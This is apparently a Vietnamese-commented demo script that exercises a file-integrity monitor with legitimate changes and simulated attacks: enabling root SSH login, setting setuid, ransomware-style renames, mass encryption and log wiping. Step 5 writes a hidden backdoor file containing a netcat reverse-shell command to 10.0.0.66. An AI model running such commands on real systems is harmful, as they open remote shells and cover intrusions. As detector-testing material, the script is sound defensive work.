#!/bin/sh
# Kịch bản vận hành: mô phỏng thay đổi hợp lệ + tấn công trên thư mục giám sát.
# Chạy trong container:  docker compose exec monitor sh tools/demo_attack.sh
# Quan sát:              docker compose logs -f monitor   và   http://127.0.0.1:5000
set -e
cd "$(dirname "$0")/.."
W=test_folder
step() { echo; echo "==> $1"; sleep "${DELAY:-3}"; }

step "1. Người dùng tạo ghi chú trong home            (mong đợi: LEGITIMATE)"
echo "meeting notes" > $W/home/user/todo.txt

step "2. Ứng dụng ghi thêm log                        (mong đợi: LEGITIMATE - whitelist allow *.log)"
echo "$(date '+%F %T') INFO request ok" >> $W/var/log/app.log

step "3. Sửa cấu hình hệ thống: bật đăng nhập root    (mong đợi: SUSPICIOUS/HIGH)"
echo "PermitRootLogin yes" >> $W/etc/config.conf

step "4. Bật setuid cho script trong bin              (mong đợi: SUSPICIOUS/HIGH - leo thang quyền)"
chmod u+s $W/bin/script.sh

step "5. Tạo file ẩn (backdoor) trong home            (mong đợi: SUSPICIOUS)"
echo "nc -e /bin/sh 10.0.0.66 4444" > $W/home/user/.backdoor

step "6. Ransomware đổi tên file sang .locked         (mong đợi: SUSPICIOUS/HIGH - MOVED)"
mv $W/home/user/README.txt $W/home/user/README.txt.locked

step "7. Mã hóa hàng loạt: 12 file mới cùng lúc       (mong đợi: SUSPICIOUS - mass change)"
for i in 1 2 3 4 5 6 7 8 9 10 11 12; do echo "enc $i" > $W/home/user/doc$i.txt.enc; done

step "8. Xóa dấu vết: làm rỗng file log               (mong đợi: SUSPICIOUS - whitelist bị override)"
: > $W/var/log/app.log

echo
echo "Xong. Xem: docker compose exec monitor python main.py alerts"
